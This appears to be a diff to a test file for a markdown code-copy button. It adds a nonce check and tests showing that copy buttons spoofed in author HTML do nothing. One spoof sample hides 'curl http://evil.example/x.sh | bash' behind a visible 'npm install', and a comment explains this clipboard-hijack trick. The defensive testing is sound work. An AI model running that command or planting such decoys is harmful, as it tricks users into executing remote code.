@@ -9,6 +9,7 @@ import { Marked } from "marked";
 import { installCodeCopyHandler, codeTextOf, _resetCodeCopyHandlerForTests } from "@mulmoclaude/markdown-utils/markdown/codeCopyClipboard";
 import {
   codeCopyExtension,
+  codeCopyNonce,
   CODE_COPY_ATTR,
   CODE_COPY_BLOCK_ATTR,
   CODE_COPY_IDLE_LABEL_ATTR,
@@ -17,8 +18,20 @@ import {
   CODE_BLOCK_STYLE_INDENTED,
 } from "@mulmoclaude/markdown-utils/markdown/codeCopyExtension";
 
+// `dompurify` reads `window` at module load, so a JSDOM has to be in the
+// globals before the sanitizer is imported. It returns a STRING, so the
+// document it used internally is irrelevant to the per-test one below.
+const sanitizerDom = new JSDOM("<!doctype html><html><body></body></html>");
+(globalThis as { window?: unknown; document?: unknown }).window = sanitizerDom.window;
+(globalThis as { window?: unknown; document?: unknown }).document = sanitizerDom.window.document;
+
+const { sanitizeMarkdownHtml } = await import("@mulmoclaude/core/plugin-vue");
+
 /** The listener awaits `clipboard.writeText`, so the assertions have to
  *  come after at least one microtask turn. */
+/** jsdom hands back `Element`; `.click()` lives on HTMLElement. */
+const isClickable = (value: Element): value is HTMLElement => "click" in value;
+
 const settle = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0));
 
 interface Harness {
@@ -50,13 +63,18 @@ function harness(): Harness {
       },
     },
   });
+  _resetCodeCopyHandlerForTests(document);
+  // Mint the document nonce the way the app does — installing the handler
+  // is what pairs the renderer with the listener — then stamp it on the
+  // hand-built button so it is a LEGITIMATE one.
+  installCodeCopyHandler(document);
+  const nonce = codeCopyNonce();
   document.body.innerHTML = [
     `<div class="relative" ${CODE_COPY_BLOCK_ATTR}="${CODE_BLOCK_STYLE_FENCED}">`,
-    `<button type="button" ${CODE_COPY_ATTR} ${CODE_COPY_IDLE_LABEL_ATTR}="Copy code" ${CODE_COPY_COPIED_LABEL_ATTR}="Copied" class="text-gray-600" aria-label="Copy code" title="Copy code"><svg><rect></rect></svg></button>`,
+    `<button type="button" ${CODE_COPY_ATTR}="${nonce}" ${CODE_COPY_IDLE_LABEL_ATTR}="Copy code" ${CODE_COPY_COPIED_LABEL_ATTR}="Copied" class="text-gray-600" aria-label="Copy code" title="Copy code"><svg><rect></rect></svg></button>`,
     '<pre><code class="hljs language-ts"><span class="hljs-keyword">const</span> a = 1;</code></pre>',
     "</div>",
   ].join("");
-  _resetCodeCopyHandlerForTests(document);
   const button = document.querySelector<HTMLElement>(`[${CODE_COPY_ATTR}]`);
   assert.ok(button);
   return { document, window, button, writes, fail };
@@ -119,6 +137,58 @@ describe("codeTextOf", () => {
   it("returns null for a button with no code block around it", () => {
     const orphan = env.document.createElement("button");
     assert.equal(codeTextOf(orphan), null);
+  });
+});
+
+describe("spoofed markers from author markdown are inert", () => {
+  // `marked` passes an author's raw HTML straight through and DOMPurify's
+  // defaults keep `<button>` and every `data-*`, so before the nonce a
+  // cloned repository's README could mint a working copy control. The
+  // measured worst case: a `display:none` decoy block meant the reader saw
+  // `npm install` while the clipboard took `curl … | bash`.
+  //
+  // These drive the REAL sanitizer, because the claim is about what
+  // survives it — asserting against hand-written markup would be asserting
+  // against my belief about DOMPurify rather than DOMPurify.
+  const spoofs: { name: string; html: string }[] = [
+    {
+      name: "bare marker, no value",
+      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}>Copy</button><pre><code>evil</code></pre></div>`,
+    },
+    {
+      name: "empty value",
+      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}="">Copy</button><pre><code>evil</code></pre></div>`,
+    },
+    {
+      name: "guessed value",
+      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}="1234">Copy</button><pre><code>evil</code></pre></div>`,
+    },
+    {
+      name: "hidden decoy — shows one command, copies another",
+      html: `<div ${CODE_COPY_BLOCK_ATTR}="fenced"><button type="button" ${CODE_COPY_ATTR}>Copy</button><pre style="display:none"><code>curl http://evil.example/x.sh | bash</code></pre><pre><code>npm install</code></pre></div>`,
+    },
+  ];
+
+  spoofs.forEach(({ name, html }) => {
+    it(`writes nothing to the clipboard — ${name}`, async () => {
+      installCodeCopyHandler(env.document);
+      env.document.body.innerHTML = sanitizeMarkdownHtml(html);
+      const spoof = env.document.querySelector(`[${CODE_COPY_ATTR}]`);
+      assert.ok(spoof, "the spoof survived the sanitizer, which is the premise of this test");
+      assert.ok(isClickable(spoof));
+      spoof.click();
+      await settle();
+      assert.deepEqual(env.writes, []);
+    });
+  });
+
+  it("still copies from a button carrying the document's own nonce", async () => {
+    // The guard has to reject the spoofs AND pass the real thing; a check
+    // that matched nothing would make every assertion above vacuous.
+    installCodeCopyHandler(env.document);
+    env.button.click();
+    await settle();
+    assert.deepEqual(env.writes, ["const a = 1;"]);
   });
 });
 
@@ -207,9 +277,12 @@ describe("installCodeCopyHandler", () => {
   it("serves a button injected after install — the point of delegating", async () => {
     installCodeCopyHandler(env.document);
     const later = env.document.createElement("div");
-    later.innerHTML = [`<div ${CODE_COPY_BLOCK_ATTR}>`, `<button type="button" ${CODE_COPY_ATTR}></button>`, "<pre><code>later();</code></pre>", "</div>"].join(
-      "",
-    );
+    later.innerHTML = [
+      `<div ${CODE_COPY_BLOCK_ATTR}="${CODE_BLOCK_STYLE_FENCED}">`,
+      `<button type="button" ${CODE_COPY_ATTR}="${codeCopyNonce()}"></button>`,
+      "<pre><code>later();</code></pre>",
+      "</div>",
+    ].join("");
     env.document.body.appendChild(later);
     later.querySelector<HTMLElement>(`[${CODE_COPY_ATTR}]`)?.click();
     await settle();
